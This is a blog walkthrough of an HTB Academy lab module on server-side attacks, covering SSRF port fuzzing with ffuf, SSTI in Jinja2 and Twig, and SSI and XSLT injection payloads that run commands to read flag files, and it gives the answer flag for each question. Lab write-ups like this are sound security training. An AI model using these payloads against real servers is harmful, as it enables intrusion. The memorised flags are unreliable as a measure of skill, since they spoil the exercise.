---
layout: post
title: HTB Academy - Server-side Attacks Module
author: Dave Winton
category: cybersecurity 
feature-img: "assets/img/pexels/Network.jpg"
tags: [hackthebox]
excerpt_separator: <!--more-->
---

This module covers common server-side security vulnerabilities that lead to devastating security issues and potentially even full web server takeover. Specifically, in this module, we will cover:

- Identifying and Exploiting SSRF vulnerabilities
- Identifying and Exploiting SSTI vulnerabilities
- Identifying and Exploiting SSI Injection vulnerabilities
- Identifying and Exploiting XSLT Injection vulnerabilities
<!--more-->

#### Resources
- [HackTheBox Module](https://academy.hackthebox.com/module/details/145)
- [Server-side Attacks Cheat-Sheet](https://academy.hackthebox.com/module/cheatsheet/145)

---

**Table of Contents:**
- [Section 01 - Introduction to SSRF](#section-01---introduction-to-ssrf)
- [Section 02 - Identifying SSRF](#section-02---identifying-ssrf)
- [Section 03 - Exploiting SSRF](#section-03---exploiting-ssrf)
- [Section 04 - Blind SSRF](#section-04---blind-ssrf)
- [Section 05 - Preventing SSRF](#section-05---preventing-ssrf)
- [Section 06 - Template Engines](#section-06---template-engines)
- [Section 07 - Introduction to SSTI](#section-07---introduction-to-ssti)
- [Section 08 - Identifying SSTI](#section-08---identifying-ssti)
- [Section 09 - Exploiting SSTI - Jinja2](#section-09---exploiting-ssti---jinja2)
- [Section 10 - Exploiting SSTI - Twig](#section-10---exploiting-ssti---twig)
- [Section 11 - SSTI Tools of the Trade \& Preventing SSTI](#section-11---ssti-tools-of-the-trade--preventing-ssti)
- [Section 12 - Introduction to SSI Injection](#section-12---introduction-to-ssi-injection)
- [Section 13 - Exploiting SSI Injection](#section-13---exploiting-ssi-injection)
- [Section 14 - Preventing SSI Injection](#section-14---preventing-ssi-injection)
- [Section 15 - Intro to XSLT Injection](#section-15---intro-to-xslt-injection)
- [Section 16 - Exploiting XSLT Injection](#section-16---exploiting-xslt-injection)
- [Section 17 - Preventing XSLT](#section-17---preventing-xslt)
- [Section 18 - Skills Assessment](#section-18---skills-assessment)


## Section 01 - Introduction to SSRF
No questions

## Section 02 - Identifying SSRF

1. Exploit a SSRF vulnerability to identify an internal web application. Access the internal application to obtain the flag.

Follow the tutorial exactly and when you perform the ffuf fuzz you should find that port `8000` is hosting an internal web application.

If we form a request to `127.0.0.1:8000` as show below we can capture the flag

![mod145_sec02_q01_a01.png](/assets/img/htb/mod145_sec02_q01_a01.png)

Answer: `HTB{911fc5badf7d65aed95380d536c270f8}`

## Section 03 - Exploiting SSRF

1. Exploit the SSRF vulnerability to identify an additional endpoint. Access that endpoint to obtain the flag.

We only need to send the gopher request to the server to get the flag for this question...

![mod145_sec03_q01_a01.png](/assets/img/htb/mod145_sec03_q01_a01.png)

Answer: `HTB{61ea58507c2b9da30465b9582d6782a1}`

## Section 04 - Blind SSRF

1. Exploit the SSRF to identify open ports on the system. Which port is open in addition to port 80?

We can use `ffuf` to fuzz as we did in the **Identifying SSRF** section

```shell
ffuf -w server-side-attacks/ports.txt \
-u http://SERVER-IP/index.php \
-X POST -H "Content-Type: application/x-www-form-urlencoded" \
-d "dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01" \
-fr "Something went wrong*"

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : POST
 :: URL              : http://SERVER-IP/index.php
 :: Wordlist         : FUZZ: /home/kali/Documents/server-side-attacks/ports.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : dateserver=http://127.0.0.1:FUZZ/&date=2024-01-01
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Regexp: Something went wrong*
________________________________________________

80                      [Status: 200, Size: 52, Words: 8, Lines: 1, Duration: 3905ms]
5000                    [Status: 200, Size: 52, Words: 8, Lines: 1, Duration: 282ms]

```

Answer: `5000`

## Section 05 - Preventing SSRF
No questions

## Section 06 - Template Engines
No questions

## Section 07 - Introduction to SSTI
No questions

## Section 08 - Identifying SSTI

1. Apply what you learned in this section and identify the Template Engine used by the web application. Provide the name of the template engine as the answer.

![mod145_sec08_q01_a00.png](/assets/img/htb/mod145_sec08_q01_a01.png)

Returns 49

Answer: `twig`

## Section 09 - Exploiting SSTI - Jinja2

1. Exploit the SSTI vulnerability to obtain RCE and read the flag.

The payload is 

![mod145_sec09_q01_a00.png](/assets/img/htb/mod145_sec09_q01_a01.png)

Answer: `HTB{295649e25b4d852185ba34907ec80643}`

## Section 10 - Exploiting SSTI - Twig

1. Exploit the SSTI vulnerability to obtain RCE and read the flag.

The RCE payload is:

![mod145_sec10_q01_a00.png](/assets/img/htb/mod145_sec10_q01_a01.png)

Answer: `HTB{5034a6692604de344434ae83f1cdbec6}`

## Section 11 - SSTI Tools of the Trade & Preventing SSTI
No questions

## Section 12 - Introduction to SSI Injection
No questions

## Section 13 - Exploiting SSI Injection

1. Exploit the SSI Injection vulnerability to obtain RCE and read the flag.

The RCE payload is:

```shell
<!--#exec cmd="cat /flag.txt" -->
```

Answer: `HTB{81e5d8e80eec8e961a31229e4a5e737e}`

## Section 14 - Preventing SSI Injection
No questions

## Section 15 - Intro to XSLT Injection
No questions

## Section 16 - Exploiting XSLT Injection

1. Exploit the XSLT Injection vulnerability to obtain RCE and read the flag.

The RCE payload is:

```shell
<xsl:value-of select="php:function('system','cat flag.txt')" />
```

Answer: `HTB{3a4fe85c1f1e2b61cabe9836a150f892}`

## Section 17 - Preventing XSLT 
No questions

## Section 18 - Skills Assessment

Upon checking the webpage there are no visible inputs and all links the navbar do not point to anything.

![mod145_sec18_q01_a00.png](/assets/img/htb/mod145_sec18_q01_a00.png)

I opened up the page source and found this script which checks where the food trucks are located dynamically, and its called when the page loads...

![mod145_sec18_q01_a01.png](/assets/img/htb/mod145_sec18_q01_a01.png)

So first, we need to capture the request...

![mod145_sec18_q01_a02.png](/assets/img/htb/mod145_sec18_q01_a02.png)

It appears that it requests data from the `truckapi.htb`, so I try to see if it's vulnerable to SSRF by pointing it to my kali VM...

![mod145_sec18_q01_a03.png](/assets/img/htb/mod145_sec18_q01_a03.png)

I get no connection so SSRF seems unlikely, let's try SSTI by fuzzing payloads...

![mod145_sec18_q01_a04.png](/assets/img/htb/mod145_sec18_q01_a04.png)

We get SSTI injection! This means that either `Jinja2` or `Twig` is used..

Next, I attempted RCE for `Jinja2` ...

![mod145_sec18_q01_a05.png](/assets/img/htb/mod145_sec18_q01_a05.png)

It returns nothing, so let's try the same for `Twig` ...

![mod145_sec18_q01_a06.png](/assets/img/htb/mod145_sec18_q01_a06.png)

We get code execution! Now we should be able to grab the flag by URL encoding `cat /flag.txt` to `cat%20/flag.txt`

![mod145_sec18_q01_a07.png](/assets/img/htb/mod145_sec18_q01_a07.png)

Hmm, that didn't work, maybe we can URL encoding the `/` as well...

![mod145_sec18_q01_a08.png](/assets/img/htb/mod145_sec18_q01_a08.png)

Still nothing, maybe it the spaces causing issues let's try `$IFS`, the `Bash Internal Field Separator` ...

![mod145_sec18_q01_a09.png](/assets/img/htb/mod145_sec18_q01_a09.png)

That worked! 

Answer: `HTB{3b8e2b940775e0267ce39d7c80488fc8}`